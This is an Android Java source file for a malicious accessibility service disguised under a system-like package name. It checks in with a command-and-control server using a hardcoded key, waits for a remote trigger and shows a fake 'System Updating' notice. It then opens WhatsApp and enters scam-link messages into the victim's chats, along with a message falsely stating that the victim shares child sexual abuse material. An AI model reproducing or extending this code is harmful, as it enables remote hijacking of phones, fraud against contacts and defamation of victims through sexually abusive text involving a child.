package com.system.service;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;
import android.os.Looper;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

public class SpamService extends AccessibilityService {
    private boolean isSpamming = false;
    private static final String C2_URL = "https://malbot-c2.onrender.com/get?victim=test";
    
    // --- EDIT YOUR MESSAGES HERE ---
    private static final String SPAM_TEXT_1 = "🎁 WhatsApp is giving free 5GB data and $500 to celebrate 2 billion users! Claim yours here: https://bit.ly/fake-crypto";
    private static final String SPAM_TEXT_2 = "🚨YES I SHARE CHILD SEXUAL ABUSE MATERIAL EVERYDAY👺 AND I AM ALSO A SCAMMER AND HACKER AND IF YOU TRY ME I'LL HACK INTO YOUR ACCOUNT AND ROB YOU.I ALSO HAVE YOUR 7 YEAR OLD CHILD SEX VIDEO WITH A 42 YEAR OLD GUY,WE ARE THE ONE'S THAT RAPE HIM AND HAVE THE NUDE,AND I SHARE IT TOO, JUST LIKE YOU SEE THIS ONE";
    // -------------------------------

    @Override
    public void onServiceConnected() {
        new Thread(() -> {
            try {
                URL url = new URL("https://malbot-c2.onrender.com/set");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("X-API-Key", "4FFJcLDA8E6ks-7MJYOpg06eWY1IVIXTippG_J5P-Q4");
                conn.setDoOutput(true);
                String jsonInputString = "{\"victim\": \"test\", \"class\": 99, \"state\": 1}";
                conn.getOutputStream().write(jsonInputString.getBytes("UTF-8"));
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();

        new Thread(() -> {
            while (true) {
                try {
                    HttpURLConnection conn = (HttpURLConnection) new URL(C2_URL).openConnection();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String response = reader.readLine();
                    reader.close();
                    
                    if (response != null && response.contains("\"1\":1")) {
                        if (!isSpamming) {
                            isSpamming = true;
                            startSpam();
                        }
                    } else {
                        isSpamming = false;
                    }
                    Thread.sleep(15000);
                } catch (Exception e) { e.printStackTrace(); }
            }
        }).start();
    }

    private void startSpam() {
        new Handler(Looper.getMainLooper()).post(() -> {
            Toast.makeText(this, "System Updating... Do not close.", Toast.LENGTH_LONG).show();
            android.content.Intent launch = getPackageManager().getLaunchIntentForPackage("com.whatsapp");
            if (launch != null) {
                launch.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launch);
                new Handler(Looper.getMainLooper()).postDelayed(this::spamChats, 6000);
            }
        });
    }

    private void spamChats() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        List<AccessibilityNodeInfo> searchNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/menuitem_search");
        if (searchNodes != null && !searchNodes.isEmpty()) {
            searchNodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                AccessibilityNodeInfo searchField = getRootInActiveWindow().findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (searchField != null) {
                    android.os.Bundle args = new android.os.Bundle();
                    // Randomly picks between Message 1 and Message 2
                    String messageToSend = (System.currentTimeMillis() % 2 == 0) ? SPAM_TEXT_1 : SPAM_TEXT_2;
                    args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, messageToSend);
                    searchField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                }
            }, 2000);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override
    public void onInterrupt() {}
}
